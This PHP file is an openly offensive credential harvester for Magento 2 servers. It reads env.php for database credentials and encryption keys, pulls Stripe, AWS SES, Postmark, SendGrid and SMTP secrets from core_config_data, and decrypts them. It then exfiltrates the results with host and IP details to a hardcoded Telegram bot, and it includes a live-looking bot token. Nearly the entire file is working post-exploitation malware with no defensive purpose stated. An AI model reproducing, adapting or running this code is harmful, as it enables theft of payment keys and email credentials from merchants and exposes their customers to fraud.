<?php
/**
 * Magento 2 Credential Harvester
 * D1337 SOVEREIGN LABS
 * 
 * Extracts:
 * 1. Stripe Keys (sk_live, pk_live)
 * 2. AWS SES SMTP Credentials
 * 3. Postmark SMTP
 * 4. SendGrid SMTP
 * 
 * Auto-decrypts and sends to Telegram
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '512M');

echo "Starting Magento Credential Harvester...\n";

// ============================================
// TELEGRAM CONFIG (Hardcoded)
// ============================================
$tg_bot_token = '8434935750:AAEzRdUUXxQWlLosrbLmVgYNMN--8anMzNQ';
$tg_chat_id = '-5057844746';

// ============================================
// TELEGRAM SEND FUNCTION
// ============================================
function send_telegram($msg, $file_path = null) {
    global $tg_bot_token, $tg_chat_id;
    if (empty($tg_bot_token) || $tg_bot_token === 'ENTER_BOT_TOKEN_HERE') return;

    // Send text message
    if ($msg) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendMessage";
        $data = ['chat_id' => $tg_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
        
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
    }

    // Send file
    if ($file_path && file_exists($file_path)) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendDocument";
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            $cfile = new CURLFile($file_path);
            $data = ['chat_id' => $tg_chat_id, 'document' => $cfile];
            
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
            curl_exec($ch);
            curl_close($ch);
        }
    }
}

// ============================================
// FIND env.php
// ============================================
function findEnvPhp() {
    $roots = [
        dirname(__FILE__) . '/../../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../app/etc/env.php',
        dirname(__FILE__) . '/../../app/etc/env.php',
        dirname(__FILE__) . '/../app/etc/env.php',
        dirname(__FILE__) . '/app/etc/env.php',
        $_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php'
    ];
    foreach ($roots as $file) {
        if (file_exists($file)) return realpath($file);
    }
    return null;
}

$envFile = findEnvPhp();
if (!$envFile) die("Error: app/etc/env.php not found.\n");

$env = include $envFile;
$dbConf = $env['db']['connection']['default'];
$host = $dbConf['host'] ?? 'localhost';
$user = $dbConf['username'] ?? '';
$pass = $dbConf['password'] ?? '';
$dbname = $dbConf['dbname'] ?? '';
$prefix = $env['db']['table_prefix'] ?? '';

// Get encryption keys
$keys = [];
if (isset($env['crypt']['key'])) $keys[] = $env['crypt']['key'];
$dir = dirname($envFile);
foreach (glob($dir . '/env*.php*') as $f) {
    if ($f == $envFile) continue;
    $c = file_get_contents($f);
    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
}
$keys = array_unique($keys);
echo "Loaded " . count($keys) . " encryption keys.\n";

// ============================================
// DECRYPT FUNCTIONS
// ============================================
if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBOX_KEYBYTES', 32);
if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);

function standalone_sodium_decrypt($encrypted_full, $key) {
    if (!function_exists('sodium_crypto_secretbox_open')) return false;
    $parts = explode(':', $encrypted_full);
    if (count($parts) < 3) return false;
    $payload = base64_decode(end($parts));
    if (!$payload || strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;
    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    
    $candidates = [$key, md5($key), substr($key, 0, 32)];
    if (strlen($key) == 64 && ctype_xdigit($key)) $candidates[] = hex2bin($key);
    if (strlen($key) == 32 && ctype_xdigit($key)) {
        // Try HKDF derivation for hex keys
        $hex_bytes = hex2bin($key);
        $hkdf = hash_hkdf('sha256', $hex_bytes, 32, '', '');
        $candidates[] = $hkdf;
    }

    foreach ($candidates as $k) {
        if (strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
        try {
            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
            if ($pt !== false) return $pt;
        } catch (Exception $e) {}
    }
    return false;
}

function standalone_mcrypt_decrypt($value, $key) {
    if (!function_exists('mcrypt_decrypt')) return false;
    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
    return rtrim($pt, "\0");
}

function smart_decrypt($value, $keys) {
    if (!$value) return '';
    foreach ($keys as $k) {
        if (strpos($value, ':3:') !== false) {
            $pt = standalone_sodium_decrypt($value, $k);
            if ($pt) return $pt;
        }
        if (strpos($value, ':') === false) {
            $pt = standalone_mcrypt_decrypt($value, $k);
            if ($pt) return $pt;
        }
    }
    return $value;
}

// ============================================
// DATABASE CONNECTION
// ============================================
try {
    $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8";
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (PDOException $e) {
    die("DB Connection Failed: " . $e->getMessage() . "\n");
}

// ============================================
// GET HOSTNAME
// ============================================
$host_name = php_uname('n');
if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
    $host_name = $_SERVER['HTTP_HOST'];
} else {
    try {
        $cfg_sql = "SELECT value FROM " . $prefix . "core_config_data WHERE path = 'web/unsecure/base_url' LIMIT 1";
        $cfg_stmt = $pdo->query($cfg_sql);
        $base_url = $cfg_stmt->fetchColumn();
        if ($base_url) {
            $parsed = parse_url($base_url);
            if (isset($parsed['host'])) $host_name = $parsed['host'];
        }
    } catch (Exception $e) {}
}

$server_ip = gethostbyname($host_name);
if (isset($_SERVER['SERVER_ADDR'])) $server_ip = $_SERVER['SERVER_ADDR'];

send_telegram("🔍 <b>Credential Harvester Started</b>\nHost: $host_name\nIP: $server_ip");

// ============================================
// HARVEST CREDENTIALS
// ============================================
$results = [];

// Query core_config_data for sensitive paths
$paths_to_check = [
    // Stripe
    'payment/stripe_payments_basic/stripe_mode' => 'Stripe Mode',
    'payment/stripe_payments_basic/stripe_test_pk' => 'Stripe Test PK',
    'payment/stripe_payments_basic/stripe_test_sk' => 'Stripe Test SK',
    'payment/stripe_payments_basic/stripe_live_pk' => 'Stripe Live PK',
    'payment/stripe_payments_basic/stripe_live_sk' => 'Stripe Live SK',
    'payment/stripe_payments/stripe_mode' => 'Stripe Mode (Alt)',
    'payment/stripe_payments/live_pk' => 'Stripe Live PK (Alt)',
    'payment/stripe_payments/live_sk' => 'Stripe Live SK (Alt)',
    
    // AWS SES
    'system/smtp/aws_ses_access_key' => 'AWS SES Access Key',
    'system/smtp/aws_ses_secret_key' => 'AWS SES Secret Key',
    'system/smtp/aws_ses_region' => 'AWS SES Region',
    'system/smtp/host' => 'SMTP Host',
    'system/smtp/username' => 'SMTP Username',
    'system/smtp/password' => 'SMTP Password',
    'smtp/general/username' => 'SMTP Username (Alt)',
    'smtp/general/password' => 'SMTP Password (Alt)',
    'smtp/configuration_option' => 'SMTP Config Type',
    
    // Postmark
    'system/smtp/postmark_api_token' => 'Postmark API Token',
    'postmark/api_token' => 'Postmark Token',
    
    // SendGrid
    'system/smtp/sendgrid_api_key' => 'SendGrid API Key',
    'sendgrid/api_key' => 'SendGrid Key',
    'system/smtp/sendgrid_username' => 'SendGrid Username',
    
    // Generic SMTP
    'system/smtp/disable' => 'SMTP Status',
    'system/smtp/port' => 'SMTP Port',
    'system/smtp/auth' => 'SMTP Auth Type',
];

$sql = "SELECT path, value FROM " . $prefix . "core_config_data WHERE path IN (" . 
       implode(',', array_fill(0, count($paths_to_check), '?')) . ")";

$stmt = $pdo->prepare($sql);
$stmt->execute(array_keys($paths_to_check));
$rows = $stmt->fetchAll();

echo "Found " . count($rows) . " config entries.\n";

foreach ($rows as $row) {
    $path = $row['path'];
    $value = $row['value'];
    $label = $paths_to_check[$path] ?? $path;
    
    if (!$value) continue;
    
    // Try to decrypt
    $decrypted = smart_decrypt($value, $keys);
    
    // Store result
    $results[] = [
        'label' => $label,
        'path' => $path,
        'raw' => $value,
        'decrypted' => $decrypted,
        'is_encrypted' => ($decrypted !== $value)
    ];
}

// ============================================
// FORMAT AND SEND RESULTS
// ============================================
$output = "";
$output .= "╔══════════════════════════════════════════╗\n";
$output .= "║  MAGENTO CREDENTIAL HARVEST RESULTS      ║\n";
$output .= "╚══════════════════════════════════════════╝\n\n";
$output .= "Host: $host_name\n";
$output .= "IP: $server_ip\n";
$output .= "Date: " . date('Y-m-d H:i:s') . "\n\n";
$output .= str_repeat("=", 60) . "\n\n";

// Categorize results
$stripe_keys = [];
$aws_ses = [];
$postmark = [];
$sendgrid = [];
$smtp_generic = [];

foreach ($results as $r) {
    $val = $r['decrypted'];
    $label = $r['label'];
    
    // Categorize
    if (strpos($label, 'Stripe') !== false) {
        $stripe_keys[] = $r;
    } elseif (strpos($label, 'AWS') !== false || strpos($label, 'SES') !== false) {
        $aws_ses[] = $r;
    } elseif (strpos($label, 'Postmark') !== false) {
        $postmark[] = $r;
    } elseif (strpos($label, 'SendGrid') !== false) {
        $sendgrid[] = $r;
    } else {
        $smtp_generic[] = $r;
    }
}

// Format Stripe
if (!empty($stripe_keys)) {
    $output .= "🔷 STRIPE KEYS\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($stripe_keys as $r) {
        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
    }
    $output .= "\n";
}

// Format AWS SES
if (!empty($aws_ses)) {
    $output .= "☁️ AWS SES CREDENTIALS\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($aws_ses as $r) {
        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
    }
    $output .= "\n";
}

// Format Postmark
if (!empty($postmark)) {
    $output .= "📮 POSTMARK SMTP\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($postmark as $r) {
        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
    }
    $output .= "\n";
}

// Format SendGrid
if (!empty($sendgrid)) {
    $output .= "📧 SENDGRID SMTP\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($sendgrid as $r) {
        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
    }
    $output .= "\n";
}

// Format Generic SMTP
if (!empty($smtp_generic)) {
    $output .= "📬 GENERIC SMTP CONFIG\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($smtp_generic as $r) {
        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
    }
    $output .= "\n";
}

if (empty($results)) {
    $output .= "⚠️ No credentials found in database.\n\n";
}

$output .= str_repeat("=", 60) . "\n";
$output .= "Total Entries: " . count($results) . "\n";

// Save to file
$clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
$outFile = __DIR__ . '/' . $clean_host . '-credentials.txt';
file_put_contents($outFile, $output);

echo $output;

// Send to Telegram
send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nFound: " . count($results) . " entries", $outFile);

echo "\nSaved to: $outFile\n";
echo "Sent to Telegram!\n";
?>
